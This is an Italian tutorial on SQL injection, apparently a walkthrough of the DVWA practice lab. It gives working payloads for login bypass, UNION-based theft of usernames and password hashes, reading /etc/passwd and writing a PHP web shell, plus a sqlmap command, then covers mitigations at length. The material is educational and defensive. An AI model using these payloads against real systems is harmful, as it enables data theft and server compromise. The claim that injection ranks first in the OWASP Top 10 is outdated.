💉 SQL Injection

La vulnerabilità più critica delle applicazioni web: manipolare database tramite input malevoli

📖 Cos'è la SQL Injection?

Definizione

La SQL Injection (SQLi) è una tecnica di code injection che sfrutta vulnerabilità nella validazione dell'input per manipolare query SQL. Un attaccante può:

  • 📊 Estrarre dati sensibili dal database
  • 🔓 Bypassare autenticazione
  • ✏️ Modificare o eliminare dati
  • 💣 Eseguire comandi amministrativi sul database
  • 🚀 In alcuni casi, eseguire comandi sul sistema operativo

Come Funziona?

Le applicazioni costruiscono query SQL concatenando stringhe con input utente. Senza validazione, l'input può contenere comandi SQL che alterano la query originale.

Esempio Vulnerabile:

// Codice PHP vulnerabile
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($db, $query);

Input Normale:

id = 1
Query: SELECT * FROM users WHERE id = '1'

Input Malevolo:

id = 1' OR '1'='1
Query: SELECT * FROM users WHERE id = '1' OR '1'='1'

La condizione '1'='1' è sempre vera, quindi la query restituisce TUTTI i record!

Tipi di SQL Injection

  • In-Band SQLi: Risultati visibili direttamente nella risposta
    • Error-based: Sfrutta messaggi di errore SQL
    • UNION-based: Usa UNION per combinare risultati
  • Blind SQLi: Nessun output diretto, si deduce dai cambiamenti
    • Boolean-based: Basata su risposte true/false
    • Time-based: Basata su ritardi (SLEEP())
  • Out-of-Band SQLi: Dati estratti tramite canali alternativi (DNS, HTTP)

Low Security Vulnerabilità e Sfruttamento

⚠️ Vulnerabilità: L'ID utente viene preso direttamente dall'input e utilizzato nella query SQL senza alcuna validazione o escaping.

Codice Vulnerabile (Concettuale):

$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($db, $query);

🎯 Bypass Autenticazione

Payload:

1' OR '1'='1'#

💡 Query Risultante:

SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'#'

Il carattere # commenta il resto della query. La condizione '1'='1' è sempre vera, quindi vengono restituiti TUTTI gli utenti dal database.

🎯 Enumerazione Database con UNION

L'operatore UNION permette di combinare risultati di query multiple. Possiamo usarlo per estrarre dati da altre tabelle.

Step 1: Scoprire Tabelle

' UNION SELECT table_name, NULL FROM information_schema.tables #

💡 Spiegazione:

information_schema.tables è una tabella di sistema MySQL che contiene informazioni su tutte le tabelle nel database.

NULL è usato per match del numero di colonne (la query originale seleziona 2 colonne: first_name, last_name).

Step 2: Scoprire Colonne della Tabella 'users'

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #

Questo rivela i nomi delle colonne nella tabella users, ad esempio:

  • user_id
  • user
  • password
  • first_name
  • last_name

Step 3: Estrarre Username e Password

' UNION SELECT user, password FROM users #

💡 Risultato:

Vengono estratti tutti gli username e gli hash delle password dal database!

admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
smithy:5f4dcc3b5aa765d61d8327deb882cf99
...

Gli hash possono poi essere crackati con strumenti come John the Ripper, hashcat, o database online di hash precalcolati (rainbow tables).

🎯 Tecniche Avanzate

Dump Completo Database:

# Estrarre versione MySQL
' UNION SELECT @@version, NULL #

# Estrarre database corrente
' UNION SELECT database(), NULL #

# Estrarre tutti i nomi di database
' UNION SELECT schema_name, NULL FROM information_schema.schemata #

# Leggere file di sistema (se permessi MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL #

# Scrivere web shell (se permessi MySQL)
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php' #

Medium Security Protezioni Implementate

🛡️ Nuove Difese:
  • Uso di mysqli_real_escape_string() per escape caratteri speciali
  • Input ID tramite dropdown (form SELECT) invece di campo testo

Codice di Protezione:

$id = mysqli_real_escape_string($db, $_POST['id']);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";

mysqli_real_escape_string() aggiunge backslash prima di caratteri speciali come virgolette singole, doppi, backslash, e NULL.

🎯 Bypass con Burp Suite

Il dropdown limita solo l'interfaccia utente, ma possiamo intercettare e modificare la richiesta HTTP.

Procedura:

  1. Configurare Burp Suite per intercettare traffico
  2. Selezionare un ID valido dal dropdown e inviare
  3. Intercettare la richiesta POST
  4. Modificare il parametro id con payload SQL: 
    id=1 UNION SELECT user, password FROM users #
  5. Inoltrare la richiesta modificata

💡 Perché Funziona (Parzialmente):

Nota che il payload NON usa virgolette singole! La query originale usa: WHERE user_id = $id (senza virgolette attorno a $id).

Quindi mysqli_real_escape_string() non ha effetto perché non stiamo usando caratteri che necessitano escaping in un contesto numerico.

Lezione: L'escaping non è sufficiente. Serve validazione del tipo di dato!

High Security Protezioni Avanzate

🛡️ Difese Implementate: La query SQL è in una pagina separata accessibile tramite popup. L'ID di sessione può essere modificato per SQL Injection.

Meccanismo:

Cliccando su "Click here to change your ID", si apre una nuova finestra dove è possibile modificare l'ID di sessione. Questo ID viene poi usato per la query.

🎯 Exploitation

Procedura:

  1. Cliccare sul link per cambiare ID (apre popup)
  2. Nella nuova finestra, inserire payload SQL nell'input ID: 
    ' UNION SELECT user, password FROM users #
  3. Inviare il form

💡 Risultato:

Anche a livello "High", la vulnerabilità SQL Injection persiste perché l'input non è validato correttamente. L'uso di mysqli_real_escape_string() non è sufficiente se la query può essere manipolata.

Vengono estratti username e hash password di tutti gli utenti.

🛡️ Strategie di Mitigazione

1. Prepared Statements (Parametrized Queries) ⭐

LA SOLUZIONE PIÙ EFFICACE - Separare completamente codice SQL da dati utente.

PHP (PDO):

$stmt = $pdo->prepare('SELECT * FROM users WHERE user_id = :id');
$stmt->execute(['id' => $id]);
$user = $stmt->fetch();

PHP (MySQLi):

$stmt = $mysqli->prepare('SELECT * FROM users WHERE user_id = ?');
$stmt->bind_param('i', $id);
$stmt->execute();
$result = $stmt->get_result();

Python:

cursor.execute('SELECT * FROM users WHERE user_id = %s', (id,))

Node.js:

connection.query('SELECT * FROM users WHERE user_id = ?', [id], callback);

✅ I parametri vengono trattati come dati, mai come codice SQL
✅ Impossibile iniettare comandi SQL
✅ Performance migliorate (query plan caching)

2. ORM (Object-Relational Mapping)

  • PHP: Laravel Eloquent, Doctrine
  • Python: Django ORM, SQLAlchemy
  • Node.js: Sequelize, TypeORM
  • Java: Hibernate
// Laravel Eloquent
$user = User::where('id', $id)->first();

// Django ORM
user = User.objects.get(id=id)

ORM genera automaticamente prepared statements sicuri.

3. Input Validation

  • Whitelist: Permettere solo pattern conosciuti e sicuri
  • Type checking: Validare tipo di dato (int, string, email, etc.)
  • Range checking: Verificare che i valori siano nel range valido
  • Length limits: Limitare lunghezza input
// Validazione ID numerico
if (!is_numeric($id) || $id < 1 || $id > 1000000) {
    die('Invalid ID');
}
$id = (int)$id;  // Cast a integer

4. Stored Procedures

Incapsulare logica SQL in stored procedures che accettano solo parametri tipizzati. 

-- MySQL Stored Procedure
DELIMITER //
CREATE PROCEDURE GetUser(IN userId INT)
BEGIN
    SELECT * FROM users WHERE user_id = userId;
END //
DELIMITER ;

-- Chiamata da PHP
$stmt = $mysqli->prepare('CALL GetUser(?)');
$stmt->bind_param('i', $id);

5. Principle of Least Privilege

  • Account database con privilegi minimi necessari
  • Permessi separati per read/write/admin
  • Disabilitare funzioni pericolose (LOAD_FILE, INTO OUTFILE)
  • Account diversi per applicazioni diverse
-- Crea utente con permessi limitati
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'webapp'@'localhost';
-- NO DELETE, NO DROP, NO CREATE, NO LOAD_FILE

6. Web Application Firewall (WAF)

  • ModSecurity con OWASP Core Rule Set
  • Cloudflare WAF
  • AWS WAF
  • Pattern detection per SQL injection (UNION, OR 1=1, etc.)

7. Error Handling Sicuro

  • ❌ Non mostrare errori SQL dettagliati agli utenti
  • ✅ Loggare errori server-side
  • ✅ Mostrare messaggi generici agli utenti
// INSICURO
mysqli_query($db, $query) or die(mysqli_error($db));

// SICURO
try {
    $stmt->execute();
} catch (PDOException $e) {
    error_log($e->getMessage());
    die('Database error occurred. Please try again.');
}

8. Security Testing

  • Static Analysis: SonarQube, Semgrep
  • Dynamic Analysis: SQLMap, Burp Suite Scanner
  • Penetration Testing: Test regolari da security team
  • Bug Bounty: Programmi di ricompensa per vulnerabilità

SQLMap Example:

sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

9. Defense in Depth

Combinare multiple strategie:

  • ✅ Prepared Statements (primaria)
  • ✅ Input Validation (secondaria)
  • ✅ WAF (terziaria)
  • ✅ Least Privilege (contenimento)
  • ✅ Monitoring & Logging (rilevamento)

📌 Riepilogo

La SQL Injection è una delle vulnerabilità più critiche e diffuse. Permette accesso non autorizzato a dati sensibili, modifica database, e in alcuni casi compromissione completa del sistema.

Soluzione definitiva: Prepared Statements (parametrized queries) combinati con input validation e principle of least privilege. Mai concatenare direttamente input utente nelle query SQL!

OWASP Top 10 #1: Le vulnerabilità di injection (inclusa SQLi) sono al primo posto nella lista OWASP delle vulnerabilità più critiche.
